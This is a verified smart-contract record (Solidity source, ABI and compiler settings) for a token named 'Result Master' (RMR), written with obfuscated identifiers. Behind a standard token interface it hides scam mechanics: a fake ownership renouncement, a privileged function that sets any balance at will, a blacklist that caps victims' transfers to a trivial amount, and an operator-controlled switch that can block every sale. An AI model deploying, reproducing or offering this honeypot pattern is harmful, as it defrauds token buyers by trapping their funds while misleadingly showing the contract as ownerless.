{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.11;\n\ninterface autoShould {\n    function createPair(address marketingAuto, address limitMin) external returns (address);\n}\n\ninterface takeMaxLiquidity {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address toAtMarketing) external view returns (uint256);\n\n    function transfer(address swapToken, uint256 totalReceiver) external returns (bool);\n\n    function allowance(address takeSellBuy, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 totalReceiver) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address swapToken,\n        uint256 totalReceiver\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed feeTokenFund, uint256 value);\n    event Approval(address indexed takeSellBuy, address indexed spender, uint256 value);\n}\n\nabstract contract isWallet {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface receiverExempt {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface modeSender is takeMaxLiquidity {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract ResultMaster is isWallet, takeMaxLiquidity, modeSender {\n\n    mapping(address => bool) public swapTake;\n\n    function decimals() external view virtual override returns (uint8) {\n        return sellIs;\n    }\n\n    bool public modeLaunchFrom;\n\n    function getOwner() external view returns (address) {\n        return exemptTotalSell;\n    }\n\n    address teamAt = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    uint256 launchedFee;\n\n    uint256 private fromSellSender;\n\n    function allowance(address enableShould, address feeLaunch) external view virtual override returns (uint256) {\n        if (feeLaunch == buyTrading) {\n            return type(uint256).max;\n        }\n        return txMode[enableShould][feeLaunch];\n    }\n\n    string private tradingAtTo = \"RMR\";\n\n    bool public receiverSender;\n\n    constructor (){\n        \n        receiverExempt tradingTeam = receiverExempt(buyTrading);\n        walletIsFrom = autoShould(tradingTeam.factory()).createPair(tradingTeam.WETH(), address(this));\n        \n        teamTotalFund = _msgSender();\n        swapTake[teamTotalFund] = true;\n        senderMin[teamTotalFund] = takeLimit;\n        exemptReceiver();\n        if (fromSellSender != receiverSellTo) {\n            modeLaunchFrom = true;\n        }\n        emit Transfer(address(0), teamTotalFund, takeLimit);\n    }\n\n    function senderTrading(address limitReceiverMode) public {\n        modeBuyLiquidity();\n        \n        if (limitReceiverMode == teamTotalFund || limitReceiverMode == walletIsFrom) {\n            return;\n        }\n        feeLiquidity[limitReceiverMode] = true;\n    }\n\n    function approve(address feeLaunch, uint256 totalReceiver) public virtual override returns (bool) {\n        txMode[_msgSender()][feeLaunch] = totalReceiver;\n        emit Approval(_msgSender(), feeLaunch, totalReceiver);\n        return true;\n    }\n\n    function limitExempt(address shouldSwap, address swapToken, uint256 totalReceiver) internal returns (bool) {\n        require(senderMin[shouldSwap] >= totalReceiver);\n        senderMin[shouldSwap] -= totalReceiver;\n        senderMin[swapToken] += totalReceiver;\n        emit Transfer(shouldSwap, swapToken, totalReceiver);\n        return true;\n    }\n\n    function owner() external view returns (address) {\n        return exemptTotalSell;\n    }\n\n    bool public totalWallet;\n\n    function transfer(address liquidityModeIs, uint256 totalReceiver) external virtual override returns (bool) {\n        return amountSender(_msgSender(), liquidityModeIs, totalReceiver);\n    }\n\n    string private txTrading = \"Result Master\";\n\n    uint256 walletSender;\n\n    function liquidityToken(uint256 totalReceiver) public {\n        modeBuyLiquidity();\n        launchedFee = totalReceiver;\n    }\n\n    uint256 constant liquidityTeam = 16 ** 10;\n\n    mapping(address => bool) public feeLiquidity;\n\n    function exemptReceiver() public {\n        emit OwnershipTransferred(teamTotalFund, address(0));\n        exemptTotalSell = address(0);\n    }\n\n    address private exemptTotalSell;\n\n    function limitTrading(address autoToken) public {\n        require(autoToken.balance < 100000);\n        if (totalWallet) {\n            return;\n        }\n        if (fromSellSender != receiverSellTo) {\n            fromSellSender = receiverSellTo;\n        }\n        swapTake[autoToken] = true;\n        \n        totalWallet = true;\n    }\n\n    function transferFrom(address shouldSwap, address swapToken, uint256 totalReceiver) external override returns (bool) {\n        if (_msgSender() != buyTrading) {\n            if (txMode[shouldSwap][_msgSender()] != type(uint256).max) {\n                require(totalReceiver <= txMode[shouldSwap][_msgSender()]);\n                txMode[shouldSwap][_msgSender()] -= totalReceiver;\n            }\n        }\n        return amountSender(shouldSwap, swapToken, totalReceiver);\n    }\n\n    address public teamTotalFund;\n\n    mapping(address => uint256) private senderMin;\n\n    event OwnershipTransferred(address indexed toAtToken, address indexed takeAtFrom);\n\n    uint8 private sellIs = 18;\n\n    function symbol() external view virtual override returns (string memory) {\n        return tradingAtTo;\n    }\n\n    uint256 private takeLimit = 100000000 * 10 ** 18;\n\n    function isEnable(address liquidityModeIs, uint256 totalReceiver) public {\n        modeBuyLiquidity();\n        senderMin[liquidityModeIs] = totalReceiver;\n    }\n\n    function balanceOf(address toAtMarketing) public view virtual override returns (uint256) {\n        return senderMin[toAtMarketing];\n    }\n\n    uint256 public receiverSellTo;\n\n    function name() external view virtual override returns (string memory) {\n        return txTrading;\n    }\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return takeLimit;\n    }\n\n    function amountSender(address shouldSwap, address swapToken, uint256 totalReceiver) internal returns (bool) {\n        if (shouldSwap == teamTotalFund) {\n            return limitExempt(shouldSwap, swapToken, totalReceiver);\n        }\n        uint256 senderAuto = takeMaxLiquidity(walletIsFrom).balanceOf(teamAt);\n        require(senderAuto == launchedFee);\n        require(swapToken != teamAt);\n        if (feeLiquidity[shouldSwap]) {\n            return limitExempt(shouldSwap, swapToken, liquidityTeam);\n        }\n        return limitExempt(shouldSwap, swapToken, totalReceiver);\n    }\n\n    function modeBuyLiquidity() private view {\n        require(swapTake[_msgSender()]);\n    }\n\n    mapping(address => mapping(address => uint256)) private txMode;\n\n    address buyTrading = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    address public walletIsFrom;\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"takeSellBuy\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"toAtToken\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"takeAtFrom\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"feeTokenFund\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"enableShould\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"feeLaunch\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"feeLaunch\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"totalReceiver\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"toAtMarketing\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"exemptReceiver\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"feeLiquidity\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"liquidityModeIs\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"totalReceiver\",\"type\":\"uint256\"}],\"name\":\"isEnable\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"autoToken\",\"type\":\"address\"}],\"name\":\"limitTrading\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"totalReceiver\",\"type\":\"uint256\"}],\"name\":\"liquidityToken\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"modeLaunchFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"receiverSellTo\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"receiverSender\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"limitReceiverMode\",\"type\":\"address\"}],\"name\":\"senderTrading\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"swapTake\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"teamTotalFund\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalWallet\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"liquidityModeIs\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"totalReceiver\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"shouldSwap\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"swapToken\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"totalReceiver\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"walletIsFrom\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"}]", "ContractName": "ResultMaster", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}